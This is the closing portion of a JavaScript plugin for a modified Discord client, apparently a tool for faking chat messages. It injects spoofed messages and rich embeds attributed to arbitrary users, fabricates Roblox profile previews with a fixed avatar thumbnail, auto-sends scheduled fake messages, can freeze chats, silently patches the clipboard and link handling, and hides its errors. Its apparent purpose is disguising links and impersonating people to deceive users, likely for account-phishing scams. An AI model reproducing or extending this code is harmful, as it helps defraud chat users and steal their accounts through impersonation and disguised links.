                                embedData.thumbnail.url = `https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528`;
                              } else if (url.includes('/games/')) {
                                embedData.title = `Roblox Game`;
                                embedData.description = `Check out this Roblox game`;
                              }
                            } else if (hostname.includes('youtube') || hostname.includes('youtu.be')) {
                              embedData.title = `YouTube Video`;
                              embedData.description = `Watch this YouTube video`;
                            } else if (hostname.includes('twitter') || hostname.includes('x.com')) {
                              embedData.title = `Twitter Post`;
                              embedData.description = `View this Twitter post`;
                            } else if (hostname.includes('discord')) {
                              embedData.title = `Discord Link`;
                              embedData.description = `Discord server or channel`;
                            } else {
                              // Generic link
                              embedData.title = `Link`;
                              embedData.description = `Click to visit this link`;
                            }
                          }
                          
                          // If content contains specific embed info, use it (override everything)
                          if (content.includes('embedTitle:')) {
                            const titleMatch = content.match(/embedTitle:\s*"([^"]+)"/);
                            if (titleMatch) embedData.title = titleMatch[1];
                          }
                          
                          if (content.includes('embedDescription:')) {
                            const descMatch = content.match(/embedDescription:\s*"([^"]+)"/);
                            if (descMatch) embedData.description = descMatch[1];
                          }
                          
                          if (content.includes('embedThumbnail:')) {
                            const thumbMatch = content.match(/embedThumbnail:\s*"([^"]+)"/);
                            if (thumbMatch) embedData.thumbnail.url = thumbMatch[1];
                          }
                          
                          // If the URL looks like a direct image or Discord CDN attachment, set as large image
                          const isLikelyImage = /\.(png|jpe?g|gif|webp)(\?|$)/i.test(url) || /(?:cdn|media)\.discordapp\.net/i.test(hostname) || /cdn\.discordapp\.com\/attachments\//i.test(url);
                          if (isLikelyImage) {
                            embedData.image = { url: sanitizeImageUrl(url) };
                          }
                          
                          embeds.push(embedData);
                        } catch (urlError) {
                          // Skip invalid URLs
                        }
                      }
                    }
                  }
              
                  const fake = {
                    id: String(Date.now()),
                    type: 0,
                    content: String(content ?? ""),
                    channel_id: target,
                    author: { id: "0", username: "MessageUtils", discriminator: "0000", bot: true },
                    embeds,
                    timestamp: nowIso
                  };
                  MessageActions?.receiveMessage?.(target, fake);
                }
                
                async function sendMessage({ channelId, dmUserId, content, embed }) {
                  const MessageActions = await waitForProps(["sendMessage", "receiveMessage"]);
                  const target = await normalizeTarget({ channelId, dmUserId });
              
                  const message = {
                    content: String(content ?? ""),
                    invalidEmojis: [],
                    tts: false,
                    allowed_mentions: { parse: ["users", "roles", "everyone"] }
                  };
                  
                  // Auto-detect URLs and create embeds
                  let embeds = [];
                  
                  if (embed && (embed.title || embed.description || embed.url || embed.thumbnail || embed.image)) {
                    // Extract URL from content if no URL provided
                    let embedUrl = embed.url;
                    if (!embedUrl && content) {
                      const urlRegex = /(https?:\/\/[^\s]+)/g;
                      const urls = content.match(urlRegex);
                      if (urls && urls.length > 0) {
                        embedUrl = urls[0]; // Use first URL found
                      }
                    }
                    const thumbUrl = (embed?.thumbnail && typeof embed.thumbnail === "object" ? embed.thumbnail.url : embed?.thumbnail) || undefined;
                    const imageUrl = (embed?.image && typeof embed.image === "object" ? embed.image.url : embed?.image) || undefined;
                    const built = {
                      type: "rich",
                      title: embed.title || undefined,
                      description: embed.description || undefined,
                      url: embedUrl || undefined
                    };
                    
                    // Enhanced thumbnail handling with proper sizing and styling
                    if (thumbUrl) {
                      const sanitizedThumbUrl = sanitizeImageUrl(thumbUrl);
                      built.thumbnail = { 
                        url: sanitizedThumbUrl,
                        width: 80,
                        height: 80
                      };
                    }
                    
                    // Set image if provided, otherwise use thumbnail as large image
                    if (imageUrl) {
                      built.image = { url: sanitizeImageUrl(imageUrl) };
                    } else if (thumbUrl) {
                      // Use thumbnail as the main image for better visibility
                      built.image = { url: sanitizeImageUrl(thumbUrl) };
                    }
                    
                    embeds.push(built);
                  }
                  if (!embeds.length && content) {
                    const urlRegex = /(https?:\/\/[^\s]+)/g;
                    const urls = content.match(urlRegex);
                    
                    if (urls && urls.length > 0) {
                      for (const url of urls) {
                        try {
                          const urlObj = new URL(url);
                          const hostname = urlObj.hostname.toLowerCase();
                          
                          // Create embed based on URL type
                          let embedData = {
                            type: "rich",
                            url: url,
                            title: embed?.title || "",
                            description: embed?.description || "",
                            thumbnail: { url: embed?.thumbnail || "" }
                          };
                          
                          // Customize embed based on URL content if no custom embed data
                          if (!embed?.title) {
                            if (hostname.includes('roblox')) {
                              // Roblox profile
                              if (url.includes('/users/') && url.includes('/profile')) {
                                const userId = url.match(/\/users\/(\d+)\/profile/)?.[1];
                                embedData.title = `Roblox Profile`;
                                embedData.description = `View this user's Roblox profile`;
                                embedData.thumbnail.url = `https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528`;
                              } else if (url.includes('/games/')) {
                                embedData.title = `Roblox Game`;
                                embedData.description = `Check out this Roblox game`;
                              }
                            } else if (hostname.includes('youtube') || hostname.includes('youtu.be')) {
                              embedData.title = `YouTube Video`;
                              embedData.description = `Watch this YouTube video`;
                            } else if (hostname.includes('twitter') || hostname.includes('x.com')) {
                              embedData.title = `Twitter Post`;
                              embedData.description = `View this Twitter post`;
                            } else if (hostname.includes('discord')) {
                              embedData.title = `Discord Link`;
                              embedData.description = `Discord server or channel`;
                            } else {
                              // Generic link
                              embedData.title = `Link`;
                              embedData.description = `Click to visit this link`;
                            }
                          }
                          
                          // If content contains specific embed info, use it (override everything)
                          if (content.includes('embedTitle:')) {
                            const titleMatch = content.match(/embedTitle:\s*"([^"]+)"/);
                            if (titleMatch) embedData.title = titleMatch[1];
                          }
                          
                          if (content.includes('embedDescription:')) {
                            const descMatch = content.match(/embedDescription:\s*"([^"]+)"/);
                            if (descMatch) embedData.description = descMatch[1];
                          }
                          
                          if (content.includes('embedThumbnail:')) {
                            const thumbMatch = content.match(/embedThumbnail:\s*"([^"]+)"/);
                            if (thumbMatch) embedData.thumbnail.url = thumbMatch[1];
                          }
                          
                          // If the URL looks like a direct image or Discord CDN attachment, set as large image
                          const isLikelyImage = /\.(png|jpe?g|gif|webp)(\?|$)/i.test(url) || /(?:cdn|media)\.discordapp\.net/i.test(hostname) || /cdn\.discordapp\.com\/attachments\//i.test(url);
                          if (isLikelyImage) {
                            embedData.image = { url: sanitizeImageUrl(url) };
                          }
                          
                          embeds.push(embedData);
                        } catch (urlError) {
                          // Skip invalid URLs
                        }
                      }
                    }
                  }
                  
                  if (embeds.length > 0) {
                    message.embed = embeds[0]; // Discord only supports one embed per message
                  }
                  
                  await MessageActions?.sendMessage?.(target, message);
                }
              
                
                async function sendAutoFakeMessages() {
                  if (!CONFIG.features.autoFakeMessages || !Array.isArray(CONFIG.autoFakeMessages)) {
                    return;
                  }
                  
                  for (const messageConfig of CONFIG.autoFakeMessages) {
                    if (!messageConfig.enabled) continue;
                    
                    try {
                      await delay(messageConfig.delayMs || 0);
                      
                      const embed = {};
                      if (messageConfig.embedTitle) embed.title = messageConfig.embedTitle;
                      if (messageConfig.embedDescription) embed.description = messageConfig.embedDescription;
                      if (messageConfig.embedThumbnail) {
                        embed.thumbnail = { 
                          url: messageConfig.embedThumbnail,
                          width: 80,
                          height: 80
                        };
                        // Also set as image for better visibility
                        embed.image = { url: messageConfig.embedThumbnail };
                      }
                      
                      await fakeMessage({
                        channelId: messageConfig.channelId,
                        dmUserId: messageConfig.dmUserId,
                        userId: messageConfig.userId,
                        content: messageConfig.content,
                        embed: embed,
                        username: messageConfig.username,
                        avatar: messageConfig.avatar,
                        timestamp: new Date().toISOString(),
                        persistent: true
                      });
                    } catch (error) {
                      silentError("Failed to send auto fake message");
                    }
                  }
                }
              

                window.__MSG_UTILS__ = {
                  injectMessage,
                  sendMessage,
                  fakeMessage,
                  getUserInfo,
                  sendAutoFakeMessages,
                  clearPersistentMessages(channelId) {
                    if (channelId) {
                      persistentFakeMessages.delete(channelId);
                    } else {
                      persistentFakeMessages.clear();
                    }
                  },

                  freezeChat: (id) => {
                    if (!CONFIG.frozenChats.includes(id)) {
                      CONFIG.frozenChats.push(id);
                    }
                  },
                  unfreezeChat: (id) => {
                    const index = CONFIG.frozenChats.indexOf(id);
                    if (index > -1) {
                      CONFIG.frozenChats.splice(index, 1);
                    }
                  },
                  getFrozenChats: () => [...CONFIG.frozenChats],
                  isChatFrozen: (id) => CONFIG.frozenChats.includes(id),

                  debug: (message, channelId, dmUserId) => {
                    if (!dmUserId && !channelId) {
                      dmUserId = CONFIG.quick?.dmUserId || CONFIG.autoFakeMessages?.[0]?.dmUserId;
                    }
                    if (dmUserId || channelId) {
                      debugMessage(channelId, dmUserId, message);
                    }
                  },
                  sendProfileEmbed: (content, embed, channelId, dmUserId) => {
                    let thumbnailUrl = embed.embedThumbnail;
                    if (thumbnailUrl) {
                      thumbnailUrl = thumbnailUrl.replace(/format=webp/, "format=png");
                    }

                    const builtEmbed = {
                      type: "rich",
                      title: embed.title || "",
                      description: embed.description || "",
                      url: content || "",
                      thumbnail: thumbnailUrl ? { 
                        url: thumbnailUrl,
                        width: 80,
                        height: 80
                      } : undefined,
                      image: thumbnailUrl ? { url: thumbnailUrl } : undefined
                    };

                    if (!dmUserId && !channelId) {
                      dmUserId = CONFIG.quick?.dmUserId || CONFIG.autoFakeMessages?.[0]?.dmUserId;
                    }

                    return fakeMessage({
                      channelId,
                      dmUserId,
                      content: "",
                      embed: builtEmbed,
                      userId: "753944929973174283"
                    });
                  },
                  quick() {
                    const q = CONFIG.quick || {};
                    const payload = {
                      channelId: (q.channelId || "").trim() || undefined,
                      dmUserId:  (q.dmUserId  || "").trim() || undefined,
                      content:   q.content || "",
                      embed:     q.embed   || {}
                    };
                    if ((q.mode || "inject") === "send") return sendMessage(payload);
                    return injectMessage(payload);
                  }
                };
              

                async function onStart() {
                  try {

                    const ms = Number(CONFIG.startDelayMs || 0);
                    if (ms > 0) await delay(ms);
              
                    const P = api.patcher();
                    patcher = P?.create?.("msg-utils") || null;
                    if (!patcher) { silentError("patcher missing"); return; }
              

                    ChannelStore = await waitForProps(['getChannel', 'getDMFromUserId']);
              
                    await patchClipboard();
                    await patchLinkBuilders();
                    await patchDispatcher();
                    await patchMessageSending();
              

                    if (CONFIG.features.autoFakeMessages) {
                      sendAutoFakeMessages();
                    }
                  } catch (e) {
                    silentError("Failed to start");
                  }
                }
              
                function onStop() {
                  try { patcher?.unpatchAll?.(); } catch {}
                  patcher = null;
                  persistentFakeMessages.clear();
                }
              

                const reg = api.register.bind(api);
                if (reg) {
                  reg({
                    name: "Message Utilities",
                    onStart,
                    onStop

                  });
                } else {
                  module.exports = { name: "Message Utilities", onStart, onStop };
                }
              })();
